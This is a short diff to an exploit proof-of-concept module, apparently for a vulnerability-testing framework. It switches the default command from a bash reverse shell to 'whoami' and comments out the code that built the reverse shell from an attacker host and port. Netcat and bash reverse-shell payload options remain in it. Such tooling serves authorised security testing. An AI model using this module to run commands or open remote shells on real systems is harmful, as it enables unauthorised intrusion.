@@ -55,8 +55,9 @@ class DemoPOC(POCBase):
 		payload = {
 			"nc": REVERSE_PAYLOAD.NC, # format -> hard coded payload with invalid param
 			"bash": REVERSE_PAYLOAD.BASH,
+			"cmd": "whoami",
 		}
-		o["command"] = OptDict(selected = "bash", default = payload)
+		o["command"] = OptDict(selected = "cmd", default = payload)
 		return o
 	
 	def _verify(self, payload = None):
@@ -111,13 +112,13 @@ class DemoPOC(POCBase):
 		return output
 	
 	def _attack(self):
-		lhost = dict(self.payload_options["lhost"])["display_value"]
-		lport = dict(self.payload_options["lport"])["display_value"]
-		cmd = REVERSE_PAYLOAD.BASH.format(lhost, lport)
-		
+		cmd = self.get_option("command")
 		return self._verify(payload = cmd)
 	
 	def _shell(self):
+		# lhost = dict(self.payload_options["lhost"])["display_value"]
+		# lport = dict(self.payload_options["lport"])["display_value"]
+		# cmd = REVERSE_PAYLOAD.BASH.format(lhost, lport)
 		pass
 
 
